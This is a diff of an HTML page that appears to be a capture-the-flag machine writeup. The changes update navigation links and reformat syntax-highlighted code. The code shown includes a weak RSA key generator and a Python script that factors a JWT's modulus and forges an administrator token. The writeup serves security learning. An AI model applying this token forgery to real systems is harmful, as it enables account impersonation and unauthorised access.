@@ -15,9 +15,9 @@
 <body>
     <header>
         <div class="container header-content">
-            <a href="../index.html" class="logo">All writeups</a>
+            <a href="../machines.html" class="logo">Machine writeups</a>
             <div class="header-controls">
-                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
                     <img src="../favicon.png" alt="Archive" width="30" height="30">
                 </a>
                 <div class="hamburger-menu">
@@ -154,95 +154,95 @@ The box tests knowledge of database exploitation, unintended file writes and pri
 <p>Inside the config directory, I found a script that generates an RSA key pair and leaks the large integer e and a very small q.</p>
 <div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
 
-<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">RSA</span>
-<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">default_backend</span>
-<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">serialization</span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">sympy</span>
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
+<span class="kn">import</span> <span class="nn">sympy</span>
 
 
 <span class="c1"># Generate RSA key pair</span>
-<span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">19</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="o">**</span><span class="mi">20</span><span class="p">)</span>
-<span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">1023</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="o">**</span><span class="mi">1024</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">q</span>
-<span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">65537</span>
-<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">q</span>
-<span class="n">phi_n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">q</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
-<span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">phi_n</span><span class="p">)</span>
-<span class="n">key_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">q</span><span class="p">}</span>
-<span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
-<span class="n">private_key_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+<span class="n">q</span> <span class="o">=</span> <span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">19</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">n</span> <span class="o">=</span> <span class="n">sympy</span><span class="o">.</span><span class="n">randprime</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">1023</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1024</span><span class="p">)</span> <span class="o">*</span> <span class="n">q</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">q</span>
+<span class="n">phi_n</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi_n</span><span class="p">)</span>
+<span class="n">key_data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span> <span class="n">n</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">:</span> <span class="n">e</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">:</span> <span class="n">p</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">q</span><span class="p">}</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
+<span class="n">private_key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
 
-<span class="n">private_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
-<span class="w">    </span><span class="n">private_key_bytes</span><span class="p">,</span>
-<span class="w">    </span><span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
-<span class="w">    </span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
+    <span class="n">private_key_bytes</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+    <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
 <span class="p">)</span>
-<span class="n">public_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
 </code></pre></div>
 
 <p>This pushed me to think that, if the JWT token I've gotten after logging into the website was also exposing integers, then I'd be able to forge an administrator JWT token and impersonate them.</p>
 <p><img alt="jwtleak" src="../images/Yummy/jwt.png" /></p>
 <p>It does indeed! I'll use this to forge an administrator JWT token!</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">base64</span>
 
-<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">json</span>
 
-<span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+<span class="kn">import</span> <span class="nn">jwt</span>
 
-<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">RSA</span>
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
 
-<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
 
-<span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">serialization</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
 
-<span class="kn">import</span><span class="w"> </span><span class="nn">sympy</span>
-
-
-
-<span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="kn">import</span> <span class="nn">sympy</span>
 
 
-<span class="n">js</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="w"> </span><span class="n">token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;===&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 
-<span class="n">n</span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="n">js</span><span class="p">[</span><span class="s2">&quot;jwk&quot;</span><span class="p">][</span><span class="s1">&#39;n&#39;</span><span class="p">])</span>
+<span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
 
-<span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="o">=</span><span class="w"> </span><span class="nb">list</span><span class="p">((</span><span class="n">sympy</span><span class="o">.</span><span class="n">factorint</span><span class="p">(</span><span class="n">n</span><span class="p">))</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
+
+<span class="n">js</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span> <span class="n">token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;===&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">n</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">js</span><span class="p">[</span><span class="s2">&quot;jwk&quot;</span><span class="p">][</span><span class="s1">&#39;n&#39;</span><span class="p">])</span>
+
+<span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="o">=</span> <span class="nb">list</span><span class="p">((</span><span class="n">sympy</span><span class="o">.</span><span class="n">factorint</span><span class="p">(</span><span class="n">n</span><span class="p">))</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
 
 <span class="n">e</span><span class="o">=</span><span class="mi">65537</span>
 
-<span class="n">phi_n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">phi_n</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">phi_n</span><span class="p">)</span>
+<span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">phi_n</span><span class="p">)</span>
 
-<span class="n">key_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">q</span><span class="p">}</span>
+<span class="n">key_data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;n&#39;</span><span class="p">:</span> <span class="n">n</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">:</span> <span class="n">e</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">:</span> <span class="n">p</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">q</span><span class="p">}</span>
 
-<span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span><span class="w"> </span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">],</span> <span class="n">key_data</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]))</span>
 
-<span class="n">private_key_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
+<span class="n">private_key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
 
 
 
-<span class="n">private_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
+<span class="n">private_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_private_key</span><span class="p">(</span>
 
-<span class="w">    </span><span class="n">private_key_bytes</span><span class="p">,</span>
+    <span class="n">private_key_bytes</span><span class="p">,</span>
 
-<span class="w">    </span><span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
 
-<span class="w">    </span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
+    <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">()</span>
 
 <span class="p">)</span>
 
-<span class="n">public_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
+<span class="n">public_key</span> <span class="o">=</span> <span class="n">private_key</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span>
 
 
 
-<span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="w">  </span><span class="n">public_key</span><span class="p">,</span><span class="w"> </span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">]</span><span class="w"> </span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span>  <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">]</span> <span class="p">)</span>
 
-<span class="n">data</span><span class="p">[</span><span class="s2">&quot;role&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;administrator&quot;</span>
-
-
+<span class="n">data</span><span class="p">[</span><span class="s2">&quot;role&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;administrator&quot;</span>
 
 
-<span class="n">new_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">private_key</span><span class="p">,</span><span class="w"> </span><span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;RS256&quot;</span><span class="p">)</span>
+
+
+<span class="n">new_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;RS256&quot;</span><span class="p">)</span>
 
 <span class="nb">print</span><span class="p">(</span><span class="n">new_token</span><span class="p">)</span>
 </code></pre></div>
